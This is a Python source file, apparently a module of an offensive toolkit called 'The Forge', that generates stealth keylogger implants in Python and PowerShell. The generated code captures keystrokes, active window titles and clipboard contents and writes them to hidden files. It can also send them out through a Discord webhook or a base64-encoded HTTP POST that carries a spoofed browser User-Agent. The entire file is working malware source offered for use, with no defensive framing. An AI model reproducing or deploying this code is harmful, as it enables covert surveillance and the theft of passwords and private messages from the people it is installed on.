"""
The Forge — Keylogger Implant
Stealth keylogger with buffer management and C2 exfiltration.
"""

import textwrap


def generate_python_keylogger(
    exfil_method: str = "file",
    log_path: str = "~/.cache/.klog",
    webhook_url: str = "",
    buffer_size: int = 500,
    flush_interval: int = 60,
    capture_clipboard: bool = True,
    capture_window_titles: bool = True
) -> str:
    """
    Python keylogger with multiple exfil options.
    
    Exfil methods: file, discord, http
    """
    
    clipboard_code = ""
    if capture_clipboard:
        clipboard_code = textwrap.dedent("""\
            def get_clipboard():
                try:
                    if os.name=='nt':
                        import ctypes
                        CF_TEXT=1
                        k32=ctypes.windll.kernel32
                        u32=ctypes.windll.user32
                        u32.OpenClipboard(0)
                        try:
                            data=u32.GetClipboardData(CF_TEXT)
                            if data:
                                buf=ctypes.c_char_p(data)
                                return buf.value.decode(errors='ignore')
                        finally:
                            u32.CloseClipboard()
                except:pass
                return None
        """)

    window_code = ""
    if capture_window_titles:
        window_code = textwrap.dedent("""\
            def get_active_window():
                try:
                    if os.name=='nt':
                        import ctypes
                        hwnd=ctypes.windll.user32.GetForegroundWindow()
                        length=ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                        buf=ctypes.create_unicode_buffer(length+1)
                        ctypes.windll.user32.GetWindowTextW(hwnd,buf,length+1)
                        return buf.value
                    else:
                        import subprocess
                        return subprocess.check_output(['xdotool','getactivewindow','getwindowname'],
                            stderr=subprocess.DEVNULL).decode().strip()
                except:return "Unknown"
        """)

    exfil_code = ""
    if exfil_method == "discord":
        exfil_code = textwrap.dedent(f"""\
            def exfil(data):
                try:
                    import urllib.request,json
                    payload=json.dumps({{"content":"```\\n"+data+"\\n```","username":"KL"}}).encode()
                    req=urllib.request.Request("{webhook_url}",data=payload,
                        headers={{"Content-Type":"application/json"}})
                    urllib.request.urlopen(req,timeout=10)
                except:pass
        """)
    elif exfil_method == "http":
        exfil_code = textwrap.dedent(f"""\
            def exfil(data):
                try:
                    import urllib.request,base64
                    encoded=base64.b64encode(data.encode()).decode()
                    req=urllib.request.Request("{webhook_url}",
                        data=encoded.encode(),
                        headers={{"Content-Type":"application/octet-stream","User-Agent":"Mozilla/5.0"}})
                    urllib.request.urlopen(req,timeout=10)
                except:pass
        """)
    else:  # file
        exfil_code = textwrap.dedent(f"""\
            def exfil(data):
                try:
                    log_file=os.path.expanduser("{log_path}")
                    os.makedirs(os.path.dirname(log_file),exist_ok=True)
                    with open(log_file,"a",encoding="utf-8") as f:
                        f.write(data)
                except:pass
        """)

    # Pre-build the window tracking block to avoid f-string backslash issues
    newline = "\\n"
    window_track_block = ""
    if capture_window_titles:
        window_track_block = textwrap.dedent("""\
            # Track active window
            try:
                win=get_active_window()
                if win!=current_window:
                    current_window=win
                    entry="\\n[" + timestamp + "] [" + win + "]\\n"
                    with lock:
                        buffer.append(entry)
            except:pass""")

    special_map_block = textwrap.dedent("""\
            special_map={
                "space":" ","enter":"\\n","tab":"\\t",
                "backspace":"[BS]","delete":"[DEL]",
                "ctrl_l":"[CTRL]","ctrl_r":"[CTRL]",
                "alt_l":"[ALT]","alt_r":"[ALT]",
                "shift":"[SHIFT]","caps_lock":"[CAPS]",
                "esc":"[ESC]"
            }""")

    code = textwrap.dedent(f"""\
        import os,sys,time,threading
        from datetime import datetime

        BUFFER_SIZE={buffer_size}
        FLUSH_INTERVAL={flush_interval}
        buffer=[]
        lock=threading.Lock()
        current_window=""

        {clipboard_code}
        {window_code}
        {exfil_code}

        def on_key(key):
            global current_window
            timestamp=datetime.now().strftime("%H:%M:%S")
            
        {window_track_block}
            
            try:
                char=key.char if hasattr(key,'char') and key.char else None
                if char:
                    with lock:
                        buffer.append(char)
                else:
                    name=str(key).replace("Key.","")
        {special_map_block}
                    mapped=special_map.get(name,"[" + name + "]")
                    with lock:
                        buffer.append(mapped)
            except:pass
            
            if len(buffer)>=BUFFER_SIZE:
                flush_buffer()

        def flush_buffer():
            global buffer
            with lock:
                if not buffer:return
                data="".join(buffer)
                buffer=[]
            exfil(data)

        def periodic_flush():
            while True:
                time.sleep(FLUSH_INTERVAL)
                flush_buffer()

        def main():
            try:
                from pynput.keyboard import Listener
            except ImportError:
                import subprocess
                subprocess.check_call([sys.executable,"-m","pip","install","pynput","-q"])
                from pynput.keyboard import Listener
            
            # Start periodic flush thread
            t=threading.Thread(target=periodic_flush,daemon=True)
            t.start()
            
            # Start keyboard listener
            with Listener(on_press=on_key) as listener:
                listener.join()

        if __name__=="__main__":
            main()
    """)
    return code


def generate_powershell_keylogger(log_path: str = "$env:APPDATA\\.klog") -> str:
    """PowerShell keylogger using GetAsyncKeyState."""
    return textwrap.dedent(f"""\
        $logFile="{log_path}"
        $signatures=@'
        [DllImport("user32.dll",CharSet=CharSet.Auto,ExactSpelling=true)]
        public static extern short GetAsyncKeyState(int virtualKeyCode);
        [DllImport("user32.dll",CharSet=CharSet.Auto)]
        public static extern int GetWindowText(IntPtr hWnd,System.Text.StringBuilder text,int count);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        '@
        $API=Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
        $lastWindow=""
        while($true){{
            Start-Sleep -Milliseconds 30
            $window=New-Object System.Text.StringBuilder 256
            $hwnd=$API::GetForegroundWindow()
            $API::GetWindowText($hwnd,$window,256)|Out-Null
            $currentWindow=$window.ToString()
            if($currentWindow -ne $lastWindow){{
                $lastWindow=$currentWindow
                $entry="`n[$(Get-Date -f 'HH:mm:ss')] [$currentWindow]`n"
                Add-Content -Path $logFile -Value $entry
            }}
            for($i=8;$i -le 190;$i++){{
                $state=$API::GetAsyncKeyState($i)
                if($state -eq -32767){{
                    $key=[System.Windows.Forms.Keys]$i
                    $char=$key.ToString()
                    if($char.Length -eq 1){{
                        Add-Content -Path $logFile -Value $char -NoNewline
                    }}else{{
                        Add-Content -Path $logFile -Value "[$char]" -NoNewline
                    }}
                }}
            }}
        }}
    """).strip()


# ---------------------------------------------------------------------------
# Master Generator
# ---------------------------------------------------------------------------

VARIANTS = {
    "python": generate_python_keylogger,
    "powershell": generate_powershell_keylogger,
}


def generate(language: str = "python", **kwargs) -> str:
    gen_func = VARIANTS.get(language.lower())
    if not gen_func:
        raise ValueError(f"Unknown language: {language}. Available: {list(VARIANTS.keys())}")
    return gen_func(**kwargs)


def list_variants() -> list[str]:
    return list(VARIANTS.keys())
